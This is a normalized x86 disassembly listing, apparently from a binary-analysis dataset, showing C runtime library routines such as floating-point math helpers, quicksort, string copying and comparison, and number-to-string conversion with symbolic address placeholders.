subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
sub esp 0x10
addsd xmm4 xmm1
movlpd [ esp + 0x4 ] xmm4
fld [ esp + 0x4 ]
add esp 0x10
retn
jmp sub_4360ef
pextrw eax xmm0 0x3
and ax 0x7fff
pinsrw xmm0 eax 0x3
sub esp 0x10
movlpd xmm1 [ r--data ]
subsd xmm1 xmm0
movlpd [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
add esp 0x10
retn
sub_4440f5
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_444185
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_444240
pop edx
retn
call sub_444257
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_444240
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_443da9
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_444257
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_443da9
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_4442be
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7600
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
sub esp 0x10
addsd xmm4 xmm1
movlpd [ esp + 0x4 ] xmm4
fld [ esp + 0x4 ]
add esp 0x10
retn
jmp sub_43621f
sub esp 0x10
shr ax 0x4
cmp ax 0xcfd
jne r-xdata
movlpd xmm3 [ r--data ]
mulsd xmm3 xmm0
subsd xmm3 xmm0
mulsd xmm3 [ r--data ]
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
mulsd xmm0 [ r--data ]
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
sub_444470
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx ecx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push esi
push edi
lea edx [ ecx + eax ]
mov esi eax
mov edx ebx
cmp edi ebx
je r-xdata
jmp r-xdata
sub ebx eax
lea edx [ ecx + eax ]
cmp ebx ecx
ja r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
push edi
push esi
call [ r--data ]
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jle r-xdata
mov esi edx
mov edi ecx
cmp esi ebx
ja r-xdata
pop edi
pop esi
sub edi ebx
mov eax [ ebp + 0x10 ]
add esi eax
cmp esi ebx
jbe r-xdata
mov edi esi
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ edi + edx - 0x1 ]
mov [ edi + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
sub_444510
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi eax
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
pop esi
sub edi eax
lea ebx [ ebx ]
mov cl [ eax ]
lea eax [ eax + 0x1 ]
mov dl [ edi + eax - 0x1 ]
mov [ edi + eax - 0x1 ] cl
mov [ eax - 0x1 ] dl
sub esi 0x1
jne r-xdata
sub_444550
mov edi edi
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x104 ] ecx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x100 ] esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xfc ] edi
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
test edx edx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov [ ebp - 0x108 ] 0x0
cmp edx 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
dec edx
imul edx edi
push ebx
add edx ecx
shr ebx 0x1
imul ebx edi
add ebx ecx
push ebx
push ecx
mov ecx esi
mov [ ebp - 0x110 ] ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push esi
push edi
push [ ebp - 0xf8 ]
push ecx
call sub_444470
add esp 0x10
jmp r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push [ ebp - 0x104 ]
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push ebx
push [ ebp - 0x104 ]
call sub_444510
add esp 0xc
mov eax [ ebp - 0x108 ]
sub eax 0x1
mov [ ebp - 0x108 ] eax
js r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push [ ebp - 0xf8 ]
push [ ebp - 0x104 ]
call sub_444510
add esp 0xc
pop ebx
mov ecx [ ebp + eax * 4 - 0xf4 ]
mov edx [ ebp + eax * 4 - 0x7c ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov edi eax
mov esi [ ebp - 0x104 ]
mov edx [ ebp - 0xfc ]
mov [ ebp - 0x114 ] eax
nop
push edi
push [ ebp - 0xf8 ]
push ebx
call sub_444510
add esp 0xc
mov [ ebp - 0xf8 ] edx
mov edi [ ebp - 0x100 ]
add esi edx
mov [ ebp - 0x10c ] esi
cmp esi ebx
jae r-xdata
mov edi [ ebp - 0x114 ]
mov [ ebp - 0x10c ] esi
push ebx
push esi
mov ecx edi
call [ r--data ]
call edi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0xf8 ]
jle r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x100 ]
push ebx
push esi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
jle r-xdata
mov edx [ ebp - 0xfc ]
sub edi edx
cmp edi ebx
jbe r-xdata
add esi edx
cmp esi eax
ja r-xdata
cmp ebx esi
ja r-xdata
mov esi [ ebp - 0x10c ]
mov [ ebp - 0x114 ] edi
cmp edi esi
jb r-xdata
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
add esp 0x8
test eax eax
jg r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
add edi edx
cmp ebx edi
jae r-xdata
mov [ ebp - 0x118 ] edx
mov [ ebp - 0x11c ] edi
cmp esi edi
je r-xdata
mov edx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
lea esp [ esp ]
mov eax [ ebp - 0xf8 ]
cmp ebx edi
jne r-xdata
mov ebx esi
mov edx edi
mov esi [ ebp - 0x118 ]
sub ebx edi
mov esi [ ebp - 0x10c ]
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x100 ]
push ebx
push edi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
cmp ebx esi
jbe r-xdata
mov ebx esi
mov [ ebp - 0x110 ] ebx
jmp r-xdata
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ ebx + edx - 0x1 ]
mov [ ebx + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov esi [ ebp - 0x10c ]
mov ebx [ ebp - 0x110 ]
mov edx [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
cmp ebx edi
jae r-xdata
sub edi edx
cmp edi [ ebp - 0x104 ]
jbe r-xdata
sub edi edx
cmp edi ebx
jbe r-xdata
cmp ebx edi
jb r-xdata
mov ecx [ ebp - 0x104 ]
mov esi [ ebp - 0x100 ]
cmp ecx edi
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] esi
mov [ ebp + eax * 4 - 0x7c ] edx
inc eax
mov [ ebp - 0x108 ] eax
mov edi [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] ebx
mov [ ebp + eax * 4 - 0x7c ] edi
inc eax
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0xf8 ]
mov eax edi
mov ebx [ ebp - 0x104 ]
mov ecx edx
sub ecx esi
sub eax ebx
cmp eax ecx
jl r-xdata
mov edi [ ebp - 0xfc ]
mov edx edi
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
mov ecx esi
mov esi [ ebp - 0x100 ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax edx
xor edx edx
sub eax ecx
div edi
lea ebx [ eax + 0x1 ]
cmp ebx 0x8
ja r-xdata
sub_4448ea
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_42fef5
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
mov [ ecx ] 0x0
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
mov [ edi ] 0x0
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
mov [ ecx ] 0x0
call sub_42fef5
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ ecx + eax - 0x1 ] 0x0
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
sub_4449b0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_444a07
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] esi
jb r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov esp ebp
pop ebp
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
dec esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ esi - 0x1 ]
pop esi
mov eax esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax esi
sub eax ecx
and eax 0x1
sub esi eax
movzx eax [ ecx ]
test [ eax + edx + 0x19 ] 0x4
jne r-xdata
dec ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
sub_444aa3
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push esi
push edi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444b73
add esp 0x10
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov esi 0x7fffffff
cmp edi esi
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
sub edi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_444b73
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov esi 0x7fffffff
cmp ebx esi
jbe r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xa4 ]
test eax eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
pop edi
push ebx
push edi
push ebx
push [ ebp + 0x8 ]
push 0x1001
push eax
call sub_44784c
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
sub eax edi
push 0x41
mov [ ebp + 0x8 ] eax
pop esi
mov eax esi
pop esi
lea esi [ eax - 0x2 ]
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
mov ecx eax
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add eax 0x20
movzx ecx ax
jmp r-xdata
movzx eax dx
movzx esi cx
sub esi eax
jmp r-xdata
test cx cx
je r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx eax [ edi ]
cmp ax si
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp cx dx
je r-xdata
add edi 0x2
sub ebx 0x1
je r-xdata
movzx eax [ eax + edi ]
push 0x5a
pop edx
cmp ax si
jb r-xdata
sub_444ca0
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444cc9
add esp 0x10
pop ebp
retn
pop ebp
jmp sub_43e2b8
sub_444cc9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_41cb44
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor esi esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov esi 0x7fffffff
jmp r-xdata
mov edx [ ebp + 0xc ]
test edx edx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi 0x7fffffff
cmp eax esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov edi [ ebp - 0xc ]
mov ebx [ edi + 0xa4 ]
test ebx ebx
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
push [ edi + 0x10 ]
push eax
push edx
push eax
push ecx
push 0x1001
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_447b5c
add esp 0x20
test eax eax
jne r-xdata
lea esi [ ebp - 0xc ]
push esi
push eax
push edx
push ecx
call sub_43e324
add esp 0x10
mov esi eax
jmp r-xdata
lea esi [ eax - 0x2 ]
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
sub_444d93
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_41cb44
mov eax [ ebp - 0x14 ]
xor edi edi
push edi
push edi
push [ ebp + 0x10 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_430a42
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea edx [ ebx + ebx ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_43aeb9
pop ecx
push ebx
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_430a42
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d0e4
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_449960
mov esi esp
test esi esi
je r-xdata
mov eax [ ebp + 0x18 ]
push edi
push edi
push eax
neg eax
sbb eax eax
and eax [ ebp + 0x14 ]
push eax
push 0xffffffff
push esi
push edi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_444e8e
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
xor edi edi
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x88 ] esi
mov [ ebx ] edi
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push [ ebp + 0x14 ]
push esi
push ecx
call sub_444d93
add esp 0x14
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
test eax eax
jne r-xdata
push edi
push edi
push [ ebp + 0x14 ]
push esi
call sub_430a42
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push 0x1
push eax
call sub_42d196
push edi
mov [ ebx ] eax
call sub_42d0aa
add esp 0xc
cmp [ ebx ] edi
je r-xdata
or eax 0xffffffff
push 0x2
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x88 ] edi
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push esi
call sub_430a42
test eax eax
je r-xdata
push 0x2
push eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
push edi
push [ ebp + 0x14 ]
push esi
push [ ebp - 0x90 ]
call sub_444d93
add esp 0x14
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
lea eax [ ecx - 0x1 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
push ecx
push [ ebx ]
call sub_44499b
add esp 0x10
test eax eax
jne r-xdata
mov al [ ebp - 0x88 ]
mov [ ebx ] al
jmp r-xdata
or edi 0xffffffff
push [ ebp - 0x8c ]
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x88 ]
call sub_430a42
jmp r-xdata
push 0x1
push eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_42fdfc
int3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push [ ebp - 0x8c ]
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x88 ]
push [ ebp - 0x90 ]
call sub_444d93
add esp 0x14
mov eax esi
mov esi edi
mov [ ebx ] eax
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
mov eax edi
jmp r-xdata
sub_445040
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ebx
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
mov edi esi
inc ecx
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] dl
inc esi
inc ecx
test eax eax
je r-xdata
mov [ esi ] 0x0
dec esi
mov [ ebx ] 0x0
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
xor edx edx
div [ ebp + 0x14 ]
cmp edx 0x9
jbe r-xdata
mov al [ edi ]
mov cl [ esi ]
mov [ esi ] al
dec esi
mov [ edi ] cl
inc edi
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4450b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
push edi
cmp [ ebp + 0x18 ] bl
je r-xdata
mov edi esi
push 0x2d
pop edx
inc ebx
mov [ eax ] dx
lea esi [ eax + 0x2 ]
neg ecx
mov [ esi ] ax
add esi 0x2
inc ebx
test ecx ecx
je r-xdata
lea eax [ edx + 0x30 ]
cmp ebx [ ebp + 0x10 ]
jb r-xdata
cmp ebx [ ebp + 0x10 ]
jb r-xdata
xor eax eax
mov [ esi ] ax
sub esi 0x2
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] cx
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov eax ecx
xor edx edx
div [ ebp + 0x14 ]
mov ecx eax
lea eax [ edx + 0x57 ]
cmp edx 0x9
ja r-xdata
mov ax [ edi ]
movzx ecx [ esi ]
mov [ esi ] ax
sub esi 0x2
mov [ edi ] cx
add edi 0x2
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_445143
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x10 ]
xor eax eax
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x4 ] eax
push edi
cmp [ ebp + 0x1c ] al
je r-xdata
mov edi [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
inc eax
mov [ ecx ] 0x2d
neg ebx
mov [ ebp - 0x4 ] eax
lea esi [ ecx + 0x1 ]
adc edx 0x0
neg edx
add cl 0x30
add cl 0x57
jmp r-xdata
cmp edi [ ebp + 0x14 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
inc esi
inc edi
test edx edx
jne r-xdata
push 0x0
push [ ebp + 0x18 ]
push edx
push ebx
call sub_449720
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp ecx 0x9
jbe r-xdata
cmp edi [ ebp + 0x14 ]
mov edi [ ebp - 0xc ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov al [ edi ]
mov cl [ esi ]
mov [ esi ] al
dec esi
mov [ edi ] cl
inc edi
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4451e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
xor eax eax
mov edx [ ebp + 0xc ]
push ebx
